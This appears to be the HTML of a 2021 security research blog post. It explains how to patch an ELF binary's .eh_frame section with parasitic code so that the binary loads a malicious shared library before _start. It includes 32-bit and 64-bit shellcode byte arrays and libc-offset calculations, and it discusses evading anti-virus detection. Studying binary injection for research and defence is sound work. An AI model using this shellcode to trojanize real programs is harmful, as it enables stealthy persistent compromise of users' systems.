@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>ELF Static Injection to Load Malicious Dynamic Link Library - Violent Binary</title><meta name="Description" content=""><meta property="og:title" content="ELF Static Injection to Load Malicious Dynamic Link Library" />
+<meta property="og:description" content="TL;DR In this blog post, I will go through the process of why and how I built a new framework called spirit 🎃, using which, I was able to load malicious dynamic link library by injecting parasitic code into the ELF file. You will see the huge difference between this static injection and the tranditional so Hijacking in Linux.
+Introduction As we know, whether it is dll hijacking in Windows or so hijacking in Linux, their idea is to insert code when the program is running to load the dynamic link library (so)." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" /><meta property="og:image" content="https://violentbinary.github.io/images/binary-code.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-11-07T20:59:56+08:00" />
+<meta property="article:modified_time" content="2021-11-07T20:59:56+08:00" /><meta property="og:site_name" content="Violent Binary" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://violentbinary.github.io/images/binary-code.png"/>
+
+<meta name="twitter:title" content="ELF Static Injection to Load Malicious Dynamic Link Library"/>
+<meta name="twitter:description" content="TL;DR In this blog post, I will go through the process of why and how I built a new framework called spirit 🎃, using which, I was able to load malicious dynamic link library by injecting parasitic code into the ELF file. You will see the huge difference between this static injection and the tranditional so Hijacking in Linux.
+Introduction As we know, whether it is dll hijacking in Windows or so hijacking in Linux, their idea is to insert code when the program is running to load the dynamic link library (so)."/>
+<meta name="application-name" content="Violent Binary">
+<meta name="apple-mobile-web-app-title" content="Violent Binary"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://violentbinary.github.io/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "ELF Static Injection to Load Malicious Dynamic Link Library",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/violentbinary.github.io\/posts\/1-elf-static-injection-to-load-malicious-dynamic-link-library\/1-elf-static-injection-to-load-malicious-dynamic-link-library-en\/"
+        },"genre": "posts","keywords": "ELF, injection, Linux, patch","wordcount":  1469 ,
+        "url": "https:\/\/violentbinary.github.io\/posts\/1-elf-static-injection-to-load-malicious-dynamic-link-library\/1-elf-static-injection-to-load-malicious-dynamic-link-library-en\/","datePublished": "2021-11-07T20:59:56+08:00","dateModified": "2021-11-07T20:59:56+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "liyansong"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : '' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Violent Binary"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/binary-code.png"
+        data-srcset="/images/binary-code.png, /images/binary-code.png 1.5x, /images/binary-code.png 2x"
+        data-sizes="auto"
+        alt="/images/binary-code.png"
+        title="/images/binary-code.png" /> Violent Binary</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><a class="menu-item" href="https://github.com/liyansong2018" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><a href="javascript:void(0);" class="menu-item language" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                        <select class="language-select" id="language-select-desktop" onchange="location = this.value;"><option value="/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" selected>English</option></select>
+                    </a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Violent Binary"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/binary-code.png"
+        data-srcset="/images/binary-code.png, /images/binary-code.png 1.5x, /images/binary-code.png 2x"
+        data-sizes="auto"
+        alt="/images/binary-code.png"
+        title="/images/binary-code.png" /> Violent Binary</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a class="menu-item" href="https://github.com/liyansong2018" title="GitHub" rel="noopener noreffer" target="_blank"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a><a href="javascript:void(0);" class="menu-item" title="Select Language">English<i class="fas fa-chevron-right fa-fw"></i>
+                    <select class="language-select" onchange="location = this.value;"><option value="/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" selected>English</option></select>
+                </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">ELF Static Injection to Load Malicious Dynamic Link Library</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>liyansong</a></span>&nbsp;<span class="post-category">included in <a href="/categories/elf/"><i class="far fa-folder fa-fw"></i>ELF</a>&nbsp;<a href="/categories/reverse-engineering/"><i class="far fa-folder fa-fw"></i>reverse engineering</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-11-07">2021-11-07</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;1469 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;7 minutes&nbsp;<span id="/posts/1-elf-static-injection-to-load-malicious-dynamic-link-library/1-elf-static-injection-to-load-malicious-dynamic-link-library-en/" class="leancloud_visitors" data-flag-title="ELF Static Injection to Load Malicious Dynamic Link Library">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;views
+                    </span>&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/images/1-elf-sj/elf-sj-title.jpg"
+        data-srcset="/images/1-elf-sj/elf-sj-title.jpg, /images/1-elf-sj/elf-sj-title.jpg 1.5x, /images/1-elf-sj/elf-sj-title.jpg 2x"
+        data-sizes="auto"
+        alt="/images/1-elf-sj/elf-sj-title.jpg"
+        title="/images/1-elf-sj/elf-sj-title.jpg" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a>
+      <ul>
+        <li><a href="#dependencies">Dependencies</a></li>
+        <li><a href="#idea">Idea</a></li>
+      </ul>
+    </li>
+    <li><a href="#entry-point-for-elf-file">Entry point for ELF file</a></li>
+    <li><a href="#base-address-of-libc">Base Address of Libc</a>
+      <ul>
+        <li><a href="#x86">x86</a></li>
+        <li><a href="#x86_64">x86_64</a></li>
+      </ul>
+    </li>
+    <li><a href="#parasitic-code">Parasitic Code</a></li>
+    <li><a href="#further-thought">Further thought</a></li>
+    <li><a href="#resources">Resources</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p><strong>TL;DR</strong> In this blog post, I will go through the process of why and how I built a new framework called <code>spirit</code> 🎃, using which, I was able to load malicious dynamic link library by injecting parasitic code into the ELF file. You will see the huge difference between this static injection and the tranditional <em>so Hijacking</em> in Linux.</p>
+<h2 id="introduction">Introduction</h2>
+<p>As we know, whether it is <strong>dll hijacking</strong> in Windows or <strong>so hijacking</strong> in Linux, their idea is to insert code when the program is running to load the dynamic link library (so). This method is called <strong>dynamic injection</strong>, which is to inject a so into a process. There are many so injection tools, such as <code>ptrace</code> and <code>hookso</code>. There is no doubt that these tools require administrator or file owners to run. In the field of worms, Trojan horses and viruses, or in the field of security protection, we need a technology similar to the patch program to write malicious code into legitimate programs.</p>
+<p>One way is to write malicious code directly into a specific section of the ELF file, but this way may be easily found and intercepted by anti-virus software; the other way is to only inject some regular code to load a malicious dynamic Link library, all logic is completed in <code>so</code>, it seems more subtle than the previously method mentioned.</p>
+<p>Let’s start by reading the definition of static injection:</p>
+<blockquote>
+<p>ELF loads malicious so at virtual address space by injecting parasitic code into it before running.</p>
+</blockquote>
+<p>Although I haven&rsquo;t found the tools or cases I want, I believe there will be some similar cases or technologies in the professional field. Here I just share some independent research and corresponding code implementation I have done.</p>
+<h3 id="dependencies">Dependencies</h3>
+<p>We run <strong>elfspirit</strong> using:</p>
+<ul>
+<li>Ubuntu 20.04 / Kali Linux 2020.4</li>
+<li>gcc 10.2.1</li>
+<li>libc-2.31/2.32</li>
+</ul>
+<h3 id="idea">Idea</h3>
+<p>Modify <code>.eh_frame</code> (of course you can also choose other sections, <code>.eh_frame</code> is a favorite section of malware), write assembly code (generally called parasitic code), and load <code>so</code> with <code>__libc_dlopen_mode</code> provided by <code>libc</code>.</p>
+<p>The most basic usage of <code>__libc_dlopen_mode</code> is the same as <code>dlopen</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="k">const</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+    <span class="kt">char</span> <span class="n">lib_name</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;libpatchdemo.so&#34;</span><span class="p">;</span>
+    <span class="kt">void</span> <span class="o">*</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">__libc_dlopen_mode</span><span class="p">(</span><span class="n">lib_name</span><span class="p">,</span> <span class="n">RTLD_LAZY</span><span class="p">);</span>
+    <span class="n">func</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">&#34;hello_world&#34;</span><span class="p">);</span>
+    <span class="n">func</span><span class="p">();</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><h2 id="entry-point-for-elf-file">Entry point for ELF file</h2>
+<p>I believe that the first program of most programmers is <em>hello world</em>, and they all have only one function, namely <code>main</code>. When we were still students, the teacher told us that the entry point of the program was the <code>main</code> function. But is this really the case?</p>
+<p><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener noreffer">Here</a> is a good overview of what happens during program startup <em>before</em> <code>main</code>. In particular, it shows that <code>__start</code> is <em>the actual entry point</em> to your program from OS viewpoint.</p>
+<p><figure><a class="lightgallery" href="/images/1-elf-sj/elf-sj-callgraph.png" title="elf-sj-callgraph" data-thumbnail="/images/1-elf-sj/elf-sj-callgraph.png" data-sub-html="<h2>How did we get to main</h2><p>elf-sj-callgraph</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/1-elf-sj/elf-sj-callgraph.png"
+            data-srcset="/images/1-elf-sj/elf-sj-callgraph.png, /images/1-elf-sj/elf-sj-callgraph.png 1.5x, /images/1-elf-sj/elf-sj-callgraph.png 2x"
+            data-sizes="auto"
+            alt="/images/1-elf-sj/elf-sj-callgraph.png" />
+    </a><figcaption class="image-caption">How did we get to main</figcaption>
+    </figure></p>
+<p><strong>As a result, <code>_start</code> is the very first address from which the instruction pointer will start counting in the program.</strong></p>
+<p>While <code>main</code> is the entry point for your program from a programmers perspective, <code>_start</code> is the usual entry point from the OS perspective (the first instruction that is executed after your program was started from the OS).</p>
+<h2 id="base-address-of-libc">Base Address of Libc</h2>
+<blockquote>
+<p>How does the parasitic code know the base address of libc before ELF is running?</p>
+</blockquote>
+<p>This is an interesting question. In different operating systems, there may be different answers. Here we have conducted experiments on Ubuntu 20.04 and Kali 2020.04.</p>
+<h3 id="x86">x86</h3>
+<p>Before the <code>_start</code> function runs, check the values of all registers and try to find the values that may be associated with the base addresses of libraries such as <code>libc</code>. We found an interesting phenomenon, that is, <code>ebx</code> stores the real address of <code>.got.plt</code> in <code>ld-2.31.so</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">$ebx</span>   : 0xf7ffd000  →  0x0002af3c
+gef➤  xinfo 0xf7ffd000
+───────── xinfo: 0xf7ffd000 ──────────────────────
+Page: 0xf7ffd000  →  0xf7ffe000 <span class="o">(</span><span class="nv">size</span><span class="o">=</span>0x1000<span class="o">)</span>
+Permissions: rw-
+Pathname: /usr/lib32/ld-2.31.so
+Offset <span class="o">(</span>from page<span class="o">)</span>: 0x0
+Inode: <span class="m">3174763</span>
+Segment: .got.plt <span class="o">(</span>0xf7ffd000-0xf7ffd028<span class="o">)</span>
+Offset <span class="o">(</span>from segment<span class="o">)</span>: 0x0
+</code></pre></div><p>Continue to view the contents of <code>.got.plt</code> in ELF loader.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">gef➤  x/dx 0xf7ffd00c
+0xf7ffd00c &lt;_dl_catch_exception@got.plt&gt;:       0xf7f084e0
+</code></pre></div><p>The function <code>_dl_catch_exception()</code> belongs to <code>libc.so</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">.text:0013F4E0                 public _dl_catch_exception
+.text:0013F4E0 _dl_catch_exception proc near           ; CODE XREF: sub_13EE00+3D7↑p
+.text:0013F4E0                                         ; _dl_catch_error+2B↓p
+</code></pre></div><p>Therefore, the base address of <code>libc</code> is as follows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">mov ecx, DWORD PTR [ebx + 0xc]
+sub ecx, 0x0013F4E0
+</code></pre></div><p>We need to find the offset address of some functions in <code>loader</code> or <code>libc</code>:</p>
+<ul>
+<li><code>_dl_catch_exception_got</code> (loader)</li>
+<li><code>_dl_catch_exception</code>, <code>__libc_dlopen_mode</code> (libc)</li>
+</ul>
+<p>The actual debugging results of the assembly code are as follows</p>
+<p><figure><a class="lightgallery" href="/images/1-elf-sj/elf-sj-patchdemo.png" title="elf-sj-patchdemo" data-thumbnail="/images/1-elf-sj/elf-sj-patchdemo.png" data-sub-html="<h2>Debug info from gef</h2><p>elf-sj-patchdemo</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/1-elf-sj/elf-sj-patchdemo.png"
+            data-srcset="/images/1-elf-sj/elf-sj-patchdemo.png, /images/1-elf-sj/elf-sj-patchdemo.png 1.5x, /images/1-elf-sj/elf-sj-patchdemo.png 2x"
+            data-sizes="auto"
+            alt="/images/1-elf-sj/elf-sj-patchdemo.png" />
+    </a><figcaption class="image-caption">Debug info from gef</figcaption>
+    </figure></p>
+<h3 id="x86_64">x86_64</h3>
+<p>Refer to the method in the previous chapter, we also found address about <code>libc</code> in <code>rdx</code>. The address points to the symbol <code>_dl_fini</code> in <code>ld.so</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="nv">$rdx</span>   : 0x00007ffff7fe21b0  →  &lt;_dl_fini+0&gt; push rbp
+gef➤  xinfo 0x00007ffff7fe22f0
+──────────────────── xinfo: 0x7ffff7fe22f0 ─────────────────────────
+Page: 0x00007ffff7fd3000  →  0x00007ffff7ff3000 <span class="o">(</span><span class="nv">size</span><span class="o">=</span>0x20000<span class="o">)</span>
+Permissions: r-x
+Pathname: /usr/lib/x86_64-linux-gnu/ld-2.32.so
+Offset <span class="o">(</span>from page<span class="o">)</span>: 0xf2f0
+Inode: <span class="m">3151771</span>
+Segment: .text <span class="o">(</span>0x00007ffff7fd3050-0x00007ffff7ff2cbe<span class="o">)</span>
+Offset <span class="o">(</span>from segment<span class="o">)</span>: 0xf2a0
+Symbol: _dl_fini
+</code></pre></div><p><code>ld-2.32.so</code></p>
+<ul>
+<li>symbol  <code>_ld_fini</code> offset：<code>0x102f0</code></li>
+<li>symbol <code>_dl_catch_exception</code>（<code>.got.plt</code>）offset：<code>0x2B018</code></li>
+</ul>
+<p>libc base address = [rdx + (0x2B018 - 0x102f0)] - 0x137A90, That is</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">mov r9, [rdx + _ld_catch_exception_got - _ld_fini]
+sub r9, _ld_catch_exceptiona
+</code></pre><p>If you want to continue calling <code>__libc_dlopen_mode</code>, you need add a line of assembly code as follows.</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">add r9, __libc_dlopen_mode
+</code></pre><p>We need to find the offset address of some functions in <code>loade</code>r or <code>libc</code>:</p>
+<ul>
+<li><code>_ld_fini</code>,  <code>_dl_catch_exception_got</code> (loader)</li>
+<li><code>_dl_catch_exception</code>, <code>__libc_dlopen_mode</code> (libc)</li>
+</ul>
+<h2 id="parasitic-code">Parasitic Code</h2>
+<p>All parasitic codes need to consider <strong>keep the original register state</strong>. The code we inserted is located between the loader and the ELF binary. Any register change may cause the program to crash. The safest approach is that the first part of the parasitic code is used to save the values of all registers, and the end part of the parasitic code is used to restore the values of all registers.</p>
+<p>Here, we briefly analyze which registers will not affect the subsequent normal operation of the program.</p>
+<p><figure><a class="lightgallery" href="/images/1-elf-sj/elf-sj-start_x86.png" title="elf-sj-start_x86" data-thumbnail="/images/1-elf-sj/elf-sj-start_x86.png" data-sub-html="<h2>Disassembly from _start function</h2><p>elf-sj-start_x86</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/1-elf-sj/elf-sj-start_x86.png"
+            data-srcset="/images/1-elf-sj/elf-sj-start_x86.png, /images/1-elf-sj/elf-sj-start_x86.png 1.5x, /images/1-elf-sj/elf-sj-start_x86.png 2x"
+            data-sizes="auto"
+            alt="/images/1-elf-sj/elf-sj-start_x86.png" />
+    </a><figcaption class="image-caption">Disassembly from _start function</figcaption>
+    </figure></p>
+<p>It can be seen from the code of <code>_start</code> that modifying the three registers of <code>ebp/esi/ecx</code> will not affect the data flow. The <code>_start</code> is automatically generated by gcc, and the behavior of different compilers may vary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">$ gcc --version     
+gcc <span class="o">(</span>Debian 10.2.1-6<span class="o">)</span> 10.2.1 <span class="m">20210110</span>
+Copyright <span class="o">(</span>C<span class="o">)</span> <span class="m">2020</span> Free Software Foundation, Inc.
+This is free software<span class="p">;</span> see the <span class="nb">source</span> <span class="k">for</span> copying conditions.  There is NO
+warranty<span class="p">;</span> not even <span class="k">for</span> MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+</code></pre></div><p>In the end, it is necessary to jump to the entrance of the program so that the program can run normally. Therefore, it is necessary to recalculate the offset of the _start function at the end of the parasitic code, and use the corresponding assembly instruction to jump.</p>
+<p>Can I directly use assembly similar to <code>jmp ecx</code> to jump? The answer is no.  Because the <code>jmp</code> instruction does not have the ability to restore the stack. After loading the target so and jumping to execute <code>_start</code>, when the main function is executed, it still needs to jump back to the beginning of the program to <em>deinit</em>.</p>
+<p>Get the value of the <code>ip</code> register</p>
+<p><code>|e8|target address - EIP|</code></p>
+<p>32bit</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">call   0x5
+pop    eax     (eip)
+</code></pre><p>64bit</p>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">lea rax, [rip]
+</code></pre><p><figure><a class="lightgallery" href="/images/1-elf-sj/elf-sj-all.png" title="elf-sj-all" data-thumbnail="/images/1-elf-sj/elf-sj-all.png" data-sub-html="<h2>Framewrok of parasitic code</h2><p>elf-sj-all</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/images/1-elf-sj/elf-sj-all.png"
+            data-srcset="/images/1-elf-sj/elf-sj-all.png, /images/1-elf-sj/elf-sj-all.png 1.5x, /images/1-elf-sj/elf-sj-all.png 2x"
+            data-sizes="auto"
+            alt="/images/1-elf-sj/elf-sj-all.png" />
+    </a><figcaption class="image-caption">Framewrok of parasitic code</figcaption>
+    </figure></p>
+<p>32bit</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint8_t</span> <span class="n">sc_x86</span><span class="p">[]</span> <span class="o">=</span> \
+    <span class="cm">/* start */</span>
+    <span class="s">&#34;</span><span class="se">\x55</span><span class="s">&#34;</span>                            <span class="c1">// push   ebp
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x89\xe5</span><span class="s">&#34;</span>                        <span class="c1">// mov    ebp, esp
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x83\xec\x28</span><span class="s">&#34;</span>                    <span class="c1">// sub    esp, 28h
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc7\x45\xe4\x6c\x69\x62\x70</span><span class="s">&#34;</span>    <span class="c1">// mov    DWORD PTR [ebp-0x1c],0x7062696c
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc7\x45\xe8\x61\x74\x63\x68</span><span class="s">&#34;</span>    <span class="c1">// mov    DWORD PTR [ebp-0x18],0x68637461
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc7\x45\xec\x64\x65\x6d\x6f</span><span class="s">&#34;</span>    <span class="c1">// mov    DWORD PTR [ebp-0x14],0x6f6d6564
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc7\x45\xf0\x2e\x73\x6f\x00</span><span class="s">&#34;</span>    <span class="c1">// mov    DWORD PTR [ebp-0x10],0x6f732e
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x6a\x01</span><span class="s">&#34;</span>                        <span class="c1">// push   0x1
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x8d\x6d\xe4</span><span class="s">&#34;</span>                    <span class="c1">// lea    ebp, [ebp-0x1c]
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x55</span><span class="s">&#34;</span>                            <span class="c1">// push   ebp
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x8b\x4b\x0c</span><span class="s">&#34;</span>                    <span class="c1">// mov ecx, DWORD PTR [ebx + 0xc]
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x81\xe9\xe0\xf4\x13\x00</span><span class="s">&#34;</span>        <span class="c1">// sub ecx, 0x0013F4E0
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x81\xc1\xf0\xea\x13\x00</span><span class="s">&#34;</span>        <span class="c1">// add ecx, 0x0013EAF0
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xff\xd1</span><span class="s">&#34;</span>                        <span class="c1">// call   ecx --&gt; &lt;__libc_dlopen_mode@plt&gt;
+</span><span class="c1"></span>    <span class="cm">/* */</span>
+    <span class="s">&#34;</span><span class="se">\x83\xc4\x08</span><span class="s">&#34;</span>                    <span class="c1">// add    esp, 0x8
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc9</span><span class="s">&#34;</span>                            <span class="c1">// leave
+</span><span class="c1"></span>    <span class="cm">/* end */</span>
+    <span class="s">&#34;</span><span class="se">\xe8</span><span class="s">&#34;</span>                            <span class="c1">// call   &lt;_start&gt; (e8 ** = _start - eip) 
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</code></pre></div><p>64bit</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint8_t</span> <span class="n">sc_x86_64</span><span class="p">[]</span> <span class="o">=</span> \
+    <span class="cm">/* start */</span>
+    <span class="s">&#34;</span><span class="se">\x55</span><span class="s">&#34;</span>                                      <span class="c1">// push   rbp
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\xe5</span><span class="s">&#34;</span>                              <span class="c1">// mov    rbp, rsp
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x83\xec\x30</span><span class="s">&#34;</span>                          <span class="c1">// sub    rsp, 30h
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\xb8\x6c\x69\x62\x70\x61\x74\x63\x68</span><span class="s">&#34;</span>  <span class="c1">// movabs rax,0x686374617062696c
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\xbb\x64\x65\x6d\x6f\x2e\x73\x6f\x00</span><span class="s">&#34;</span>  <span class="c1">// movabs rbx,0x6f732e6f6d6564
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\x45\xe0</span><span class="s">&#34;</span>                          <span class="c1">// mov    QWORD PTR [rbp-0x20],rax
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\x5d\xe8</span><span class="s">&#34;</span>                          <span class="c1">// mov    QWORD PTR [rbp-0x18],rbx
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x8d\x45\xe0</span><span class="s">&#34;</span>                          <span class="c1">// lea    rax,[rbp-0x20]
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xbe\x01\x00\x00\x00</span><span class="s">&#34;</span>                      <span class="c1">// mov    esi,0x1
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x48\x89\xc7</span><span class="s">&#34;</span>                              <span class="c1">// mov    rdi,rax
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x4c\x8b\x8a\x68\xae\x01\x00</span><span class="s">&#34;</span>              <span class="c1">// mov    r9, [rdx + 0x1ae68]
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x49\x81\xe9\xe0\x81\x13\x00</span><span class="s">&#34;</span>              <span class="c1">// sub    r9, 0x0000000001381E0
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x49\x81\xc1\x00\x78\x13\x00</span><span class="s">&#34;</span>              <span class="c1">// add    r9, 0x000000000137800
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\x41\xff\xd1</span><span class="s">&#34;</span>                              <span class="c1">// call   r9
+</span><span class="c1"></span>    <span class="s">&#34;</span><span class="se">\xc9</span><span class="s">&#34;</span>                                      <span class="c1">// leave
+</span><span class="c1"></span>    <span class="cm">/* end */</span>
+    <span class="s">&#34;</span><span class="se">\xe8\x0b\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>                     <span class="c1">// call   &lt;_start&gt;
+</span></code></pre></div><h2 id="further-thought">Further thought</h2>
+<p>By modifying the elf entry and injecting parasitic code, it is actually easy to be detected by some protection programs. We can further optimize our solution in the future, for example, directly modify the first line of code of the <code>_start</code> function to jump to the parasitic section. The parasitic code then implements the function of <code>_start</code>.</p>
+<p><a href="https://github.com/liyansong2018/elfspirit" target="_blank" rel="noopener noreffer">elfspirit</a> has integrated all the codes involved in this article, have fun.</p>
+<blockquote>
+<p>😜 Congratulations, <a href="https://twitter.com/EDG_Edward" target="_blank" rel="noopener noreffer">@EDG_Edward</a>! <a href="https://twitter.com/hashtag/Worlds2021?src=hashtag_click" target="_blank" rel="noopener noreffer">#Worlds2021</a></p>
+</blockquote>
+<h2 id="resources">Resources</h2>
+<ul>
+<li><a href="http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html" target="_blank" rel="noopener noreffer">Linux x86 Program Start Up, or - How the heck do we get to main()?</a></li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-11-07</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
